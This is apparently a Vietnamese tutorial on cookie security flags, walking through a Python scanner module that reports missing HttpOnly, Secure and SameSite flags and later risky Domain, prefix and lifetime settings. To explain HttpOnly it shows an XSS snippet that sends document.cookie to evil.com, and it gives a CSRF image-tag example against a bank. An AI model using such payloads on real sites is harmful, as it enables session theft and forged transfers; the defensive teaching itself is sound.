## 📚 Lý thuyết: Cookie là gì?

### Cơ chế hoạt động

Cookie là file nhỏ server gửi về trình duyệt để **lưu thông tin phiên đăng nhập** (session).

```
1. Người dùng đăng nhập → Gửi username/password
2. Server xác thực OK → Gửi response kèm:
   Set-Cookie: session_id=abc123
3. Trình duyệt lưu cookie
4. Mọi request sau đó → Trình duyệt tự động gửi kèm:
   Cookie: session_id=abc123
5. Server đọc cookie → Biết người dùng là ai
```

### Tại sao cookie nguy hiểm?

Cookie chứa **chìa khóa đăng nhập**. Nếu bị đánh cắp → kẻ tấn công **đăng nhập thay bạn** mà không cần mật khẩu!

```
Kẻ tấn công lấy được: session_id=abc123
→ Paste vào trình duyệt
→ Truy cập tài khoản nạn nhân ngay lập tức!
```

## 📚 3 Cờ bảo mật (Cookie Flags)

### 1. `HttpOnly` — Severity: HIGH

**Chức năng:** Cấm JavaScript đọc cookie.

**Không có HttpOnly:**
```javascript
// Kẻ tấn công chèn XSS vào trang web:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
// → Cookie bị gửi đến server kẻ tấn công!
```

**Có HttpOnly:**
```javascript
document.cookie  // → "" (không đọc được session cookie)
// → Kẻ tấn công không lấy được gì!
```

---

### 2. `Secure` — Severity: HIGH

**Chức năng:** Cookie chỉ được gửi qua HTTPS (mã hóa), không gửi qua HTTP (plain text).

**Không có Secure:**
```
Người dùng truy cập http://bank.com (không mã hóa)
→ Cookie gửi dạng plain text
→ Ai đó cùng mạng Wi-Fi có thể đọc được cookie!
```

**Có Secure:**
```
http://bank.com  → Cookie KHÔNG được gửi
https://bank.com → Cookie được gửi (mã hóa)
```

---

### 3. `SameSite` — Severity: MEDIUM

**Chức năng:** Chặn trình duyệt gửi cookie khi request đến từ trang khác (cross-site).

**Không có SameSite → Bị CSRF (Cross-Site Request Forgery):**
```html
<!-- Trên trang evil.com, kẻ tấn công đặt: -->
<img src="https://bank.com/transfer?to=hacker&amount=1000000">

<!-- Khi nạn nhân mở evil.com:
   1. Trình duyệt tải ảnh → Gửi GET request đến bank.com
   2. Trình duyệt TỰ ĐỘNG gửi kèm cookie bank.com
   3. Bank.com nghĩ đây là request hợp lệ → Chuyển tiền!
-->
```

**Có SameSite:**
```
SameSite=Strict  → Cookie KHÔNG gửi từ trang khác (an toàn nhất)
SameSite=Lax     → Cookie chỉ gửi khi click link, không gửi cho img/form POST
SameSite=None    → Gửi thoải mái (phải kèm Secure)
```

---

### Tổng hợp cookie an toàn vs không an toàn:

```
❌ Set-Cookie: session_id=abc123
   → Không có flag nào, dễ bị tấn công!

✅ Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
   → Đầy đủ 3 flags, an toàn!
```

## ⚠️ Tại sao chỉ check 3 flags? (Không thêm nữa)

Có nhiều cookie attributes khác nhưng **không nên check** vì logic ngược hoặc không phù hợp:

| Attribute | Tại sao KHÔNG check? |
|-----------|---------------------|
| `Partitioned` | Quá mới (CHIPS proposal), hầu hết cookie không cần. Check sẽ tạo false positive |
| `Domain` | Cookie **KHÔNG có** Domain thực ra **an toàn hơn** — chỉ gửi cho exact domain, không gửi cho subdomain. Check "thiếu Domain" = báo sai! |
| `Path` | Mặc định `Path=/` đã OK. Không phải lỗ hổng nếu thiếu |
| `__Host-` prefix | Đây là **prefix tên cookie**, không phải flag. Chỉ áp dụng cho cookie nhạy cảm đặc biệt, không phải mọi cookie |
| `__Secure-` prefix | Tương tự, là prefix chuyên biệt. Cookie tên `theme=dark` không cần prefix `__Secure-` |
| `Max-Age`/`Expires` | Cookie session (không có Max-Age) bị xóa khi đóng trình duyệt = **an toàn hơn** cookie persistent! |

### Nguyên tắc: Chỉ check flags **phổ quát** (universal)

- `HttpOnly`, `Secure`, `SameSite` = **MỌI cookie** đều cần → check hợp lý ✅
- `Domain`, `__Host-`, `Partitioned` = **tùy trường hợp** → check sẽ tạo false positive ❌

> 💡 **False Positive** = báo lỗi nhưng thực tế không phải lỗi. Scanner tạo quá nhiều false positive sẽ mất uy tín — người dùng không tin kết quả nữa!

## 📚 Lý thuyết: Sự khác biệt với HeadersModule

### HeadersModule — Kiểm tra 1 tầng:

```
Response headers: { "csp": "...", "hsts": "..." }
→ Duyệt danh sách headers → Check có tồn tại không → Done
```

### CookiesModule — Kiểm tra 2 tầng (Nested Loop):

```
Response có nhiều cookies:
├── Cookie 1: "session_id=abc; HttpOnly"
│   ├── Check Secure?   → THIẾU → Finding!
│   ├── Check HttpOnly? → CÓ    → OK
│   └── Check SameSite? → THIẾU → Finding!
│
└── Cookie 2: "theme=dark; Path=/"
    ├── Check Secure?   → THIẾU → Finding!
    ├── Check HttpOnly? → THIẾU → Finding!
    └── Check SameSite? → THIẾU → Finding!

Tổng: 5 findings
```

→ Cần **2 vòng lặp lồng nhau**: vòng ngoài duyệt cookies, vòng trong duyệt flags.

## 📚 Lý thuyết: Lấy raw cookies từ httpx

### Tại sao dùng `get_list()` thay vì `get()`?

```python
# get() chỉ trả về 1 giá trị (header cuối cùng)
response.headers.get("set-cookie")
# → "theme=dark; Path=/"  ← Mất cookie đầu tiên!

# get_list() trả về TẤT CẢ giá trị
response.headers.get_list("set-cookie")
# → ["session_id=abc; HttpOnly; Secure", "theme=dark; Path=/"]
```

HTTP cho phép server gửi **nhiều header cùng tên**. Mỗi `Set-Cookie` là 1 cookie riêng biệt.

### Parse tên cookie:

```python
cookie_str = "session_id=abc123; HttpOnly; Secure; Path=/"
parts = [p.strip() for p in cookie_str.split(";")]   # ["session_id=abc123", "HttpOnly", "Secure", "Path=/"]
cookie_name = parts[0].split("=")[0].strip()
# → "session_id"
```

### Check flag tồn tại:

```python
attributes = {p.split("=")[0].strip().lower() for p in parts[1:]}   # {"httponly", "secure", "path"}
"httponly" in attributes  # True
"samesite" in attributes  # False → Finding!
```

→ Dùng `.lower()` vì flags **case-insensitive** (HttpOnly = httponly = HTTPONLY).

## 💻 Code hoàn chỉnh

File: `backend/app/modules/cookies.py`

```python
import httpx
from app.modules.base import HTTP_TIMEOUT, BaseModule

class CookiesModule(BaseModule):
    @property
    def name(self) -> str:
        return "cookies"

    @property
    def description(self) -> str:
        return "Kiểm tra cờ bảo mật của Cookie"

    COOKIE_FLAGS = [
        {
            "name": "Secure",
            "severity": "high",
            "description": "Cookie chỉ gửi qua HTTPS",
            "remediation": "Thêm cookie flag: Secure"
        },
        {
            "name": "HttpOnly",
            "severity": "high",
            "description": "Ngăn cookie bị đánh cắp bởi XSS",
            "remediation": "Thêm cookie flag: HttpOnly"
        },
        {
            "name": "SameSite",
            "severity": "medium",
            "description": "Chống tấn công CSRF",
            "remediation": "Thêm cookie flag: SameSite=Lax hoặc Strict"
        }
    ]

    async def scan(self, url: str, **kwargs) -> list:
        findings = []

        async with httpx.AsyncClient(timeout=HTTP_TIMEOUT) as client:
            response = await client.get(url)

        # Lấy tất cả raw cookies
        raw_cookies = response.headers.get_list("set-cookie")

        if not raw_cookies:
            return findings

        # Vòng ngoài: duyệt từng cookie
        for cookie_str in raw_cookies:
            parts = [p.strip() for p in cookie_str.split(";")]
            cookie_name = parts[0].split("=")[0].strip()
            # Chỉ so khớp TÊN THUỘC TÍNH (bỏ phần đầu "tên=giá trị")
            attributes = {p.split("=")[0].strip().lower() for p in parts[1:]}

            # Vòng trong: duyệt từng flag
            for flag in self.COOKIE_FLAGS:
                if flag["name"].lower() not in attributes:
                    findings.append({
                        "module": self.name,
                        "name": cookie_name,
                        "flag_missing": flag["name"],
                        "severity": flag["severity"],
                        "description": flag["description"],
                        "remediation": flag["remediation"],
                        "url": url
                    })

        return findings
```

## 🐞 Bài học: so khớp theo *thuộc tính*, không phải *chuỗi con*

Phiên bản đầu tiên kiểm tra cờ bằng **tìm chuỗi con** trong cả dòng `Set-Cookie` (`flag.lower() in cookie_str.lower()`). Cách này đơn giản nhưng cho **âm tính giả** (bỏ sót lỗi thật):

| Dòng `Set-Cookie` | Cách cũ (chuỗi con) | Đúng |
|---|---|---|
| `session_secure=1; HttpOnly` (tên chứa chữ "secure") | Coi như **có** `Secure` | Thiếu `Secure` |
| `id=samesite_httponly; Path=/` (giá trị chứa tên cờ) | Coi như có `SameSite` **và** `HttpOnly` | Thiếu cả hai |
| `a=1; Comment=samesite` | Coi như có `SameSite` | Thiếu `SameSite` |

Đã sửa: tách dòng theo dấu `;`, **bỏ phần đầu** (`tên=giá trị`), lấy *tên* mỗi thuộc tính (phần trước dấu `=`, chữ thường) vào một `set`, rồi kiểm tra `flag in attributes`. Nhờ vậy `SameSite=Lax`, `SECURE`, `httponly ` (có khoảng trắng) đều nhận đúng, còn chữ trùng ngẫu nhiên trong tên/giá trị thì không. Các trường hợp trên đều có test (`tests/unit/test_cookie_attributes.py`).

> 💡 **Nguyên tắc:** khi dữ liệu có cấu trúc (`a; b=c; d`), hãy **phân tích cấu trúc** rồi so khớp từng phần, đừng tìm chuỗi con trong văn bản thô.

Lưu ý còn lại: mỗi finding có thêm trường `flag_missing` (cờ nào thiếu), nhưng schema `Finding` của API không có trường đó nên nó **không** xuất hiện ở `GET /scan/{id}` (chỉ có trong gói SSE thô). Frontend chỉ dùng `name` (tên cookie).

## 🔑 Takeaway

1. **Cookie** = chìa khóa đăng nhập, nếu bị đánh cắp = mất tài khoản
2. **3 flags bắt buộc:** `HttpOnly` (chặn JS đọc), `Secure` (chỉ HTTPS), `SameSite` (chặn CSRF)
3. **`get_list()`** thay vì `get()` vì HTTP cho phép nhiều header cùng tên
4. **Nested loop** — module có 2 tầng dữ liệu (cookies × flags) nên cần 2 vòng lặp
5. **Case-insensitive** — luôn `.lower()` khi so sánh HTTP values

## 📚 Cập nhật sau Sprint 1 — khi nào thì những kiểm tra "không nên thêm" lại hợp lý

> Mục trên (`⚠️ Tại sao chỉ check 3 flags?`) từng loại bỏ việc check `Domain`, prefix `__Host-`/`__Secure-`, và `Max-Age`/`Expires` vì sợ **false positive**. Kết luận đó **đúng** cho đúng câu hỏi nó trả lời ("cookie *thiếu* thuộc tính này có phải lỗi không?" → không). Nhưng có một câu hỏi *khác*, hẹp hơn, cho mỗi thuộc tính — và câu hỏi đó mới đáng check:

| Thuộc tính | Câu hỏi SAI (đã loại bỏ, đúng khi loại bỏ) | Câu hỏi ĐÚNG (check mới, hẹp hơn nhiều) |
|---|---|---|
| `Domain` | "Cookie thiếu `Domain` có phải lỗi?" → Không, thiếu `Domain` an toàn hơn | "Cookie **giống phiên đăng nhập** mà **có** `Domain` có phải lỗi?" → Có — nó tự nới quyền truy cập cho mọi subdomain |
| `__Host-`/`__Secure-` | "Cookie không dùng prefix có phải lỗi?" → Không, prefix là tùy chọn | "Cookie **tự đặt tên** bắt đầu bằng `__Host-`/`__Secure-` mà **không đáp ứng điều kiện prefix đó yêu cầu** có phải lỗi?" → Có — trình duyệt sẽ **âm thầm từ chối** cookie này |
| `Max-Age`/`Expires` | "Cookie không có Max-Age có phải lỗi?" → Không, session cookie an toàn hơn | "Cookie **giống phiên đăng nhập** mà sống **hơn 30 ngày** có phải lỗi?" → Có — cookie bị đánh cắp vẫn dùng được rất lâu |

→ Bài học: kiểm tra *sự vắng mặt* của một thuộc tính tùy chọn gần như luôn sai (ai cũng thiếu, vì nó tùy chọn thật). Kiểm tra *giá trị bất hợp lý khi thuộc tính đã có mặt*, hoặc chỉ áp dụng **có điều kiện** (cookie trông như session/token), mới là check có giá trị.

### 1. Nhận diện "cookie giống phiên đăng nhập" bằng regex tên

Không thể biết chắc một cookie có phải session/token hay không chỉ từ HTTP response — nhưng **tên cookie là gợi ý khá tốt**:
```python
SESSION_COOKIE_PATTERN = re.compile(r"sess|sid|auth|token|jwt|login|csrf|xsrf", re.IGNORECASE)
```
Đây là **heuristic** (phỏng đoán có cơ sở, không chắc chắn 100%) — cookie tên `cart_id` sẽ bị bỏ qua dù có thể cũng nhạy cảm, nhưng đổi lại gần như không có false positive trên cookie rõ ràng không nhạy cảm (`theme`, `lang`, `consent`...).

### 2. `SameSite=None` — giá trị hợp lệ nhưng rủi ro

`SameSite` trước đây chỉ check *có/không có*. Nhưng `SameSite=None` là một giá trị **hợp lệ và có chủ đích** (cho phép gửi cookie cross-site — cần cho nút "Login with Google" nhúng iframe, ví dụ) — tức là **có mặt vẫn có thể là vấn đề**:
```python
if attributes.get("samesite", "").lower() == "none":
    issues.append("SameSite=None")
```
→ Đây là lý do cần lưu lại **giá trị** của từng attribute (`attribute_values: dict[str, str]`), không chỉ *tên* attribute như bản gốc (`attributes: set[str]`).

### 3. Vi phạm prefix `__Host-`/`__Secure-` — quy tắc trình duyệt tự áp đặt

Hai tiền tố này là cơ chế trình duyệt dùng để "khoá" ý nghĩa của chính cái tên cookie:
- `__Secure-` bắt buộc phải có `Secure`.
- `__Host-` bắt buộc có `Secure`, **`Path=/`**, và **không được có** `Domain`.

Nếu server đặt tên cookie `__Host-session` nhưng thiếu điều kiện trên, trình duyệt **không báo lỗi gì** — nó chỉ lặng lẽ **từ chối lưu cookie**, khiến tính năng dùng cookie đó (vd đăng nhập) hỏng một cách khó hiểu khi debug.
```python
if lowered.startswith("__secure-") and "secure" not in attributes:
    issues.append("cookie_prefix_violation")
elif lowered.startswith("__host-") and (
    "secure" not in attributes or attributes.get("path") != "/" or "domain" in attributes
):
    issues.append("cookie_prefix_violation")
```

### 4. Tính thời hạn sống từ `Max-Age` hoặc `Expires`

`Max-Age` (giây, ưu tiên theo RFC 6265 vì mới hơn) hoặc `Expires` (định dạng ngày HTTP, vd `Wed, 01 Jan 2099 00:00:00 GMT`) — phải thử cả hai vì server có thể chỉ gửi một trong hai:
```python
def _lifetime_seconds(attributes: dict[str, str]) -> float | None:
    max_age = attributes.get("max-age")
    if max_age is not None:
        return float(max_age)  # (có try/except cho giá trị không phải số)
    expires = attributes.get("expires")
    if expires:
        when = parsedate_to_datetime(expires)   # email.utils — parser chuẩn cho định dạng ngày HTTP
        return (when - datetime.now(timezone.utc)).total_seconds()
    return None
```
`email.utils.parsedate_to_datetime` là lựa chọn hay bị bỏ sót: định dạng ngày trong HTTP (RFC 1123) giống hệt định dạng ngày trong email, nên thư viện chuẩn của Python xử lý được mà không cần cài thêm gì.

### 5. Kết quả kiểm chứng (test mới)

`tests/unit/test_cookie_issues.py` — ví dụ cookie **đủ cả 3 flag cũ** nhưng vẫn bị báo lỗi vì cấu hình khác:
```python
async def test_session_cookie_with_domain_is_broad() -> None:
    assert await _issues("sessionid=1; Domain=e.com; Secure; HttpOnly; SameSite=Lax") == ["cookie_broad_domain"]

async def test_long_lived_session_cookie_by_max_age() -> None:
    assert await _issues("token=1; Max-Age=31536000; Secure; HttpOnly; SameSite=Lax") == ["cookie_long_lived"]
```
Và ngược lại — cookie **không giống session** (`theme`, `cart`) dùng `Domain` hoặc sống lâu thì **không** bị báo, đúng như nguyên tắc tránh false positive mà Task 1.3 đã đặt ra từ đầu.

### 🔑 Takeaway (bổ sung)

1. **"Không nên check sự vắng mặt của X"** và **"không nên check X"** là hai kết luận khác nhau — cái đầu thường đúng, cái sau thì chưa chắc.
2. **Heuristic theo tên** (regex trên tên cookie) là cách thực dụng để thu hẹp phạm vi một check xuống đúng nhóm dữ liệu rủi ro, giảm false positive mà không cần hiểu ngữ nghĩa ứng dụng.
3. **Prefix cookie (`__Host-`/`__Secure-`) là hợp đồng do trình duyệt áp đặt, vi phạm thì fail âm thầm** — loại lỗi này rất khó tự debug nếu không biết quy tắc.
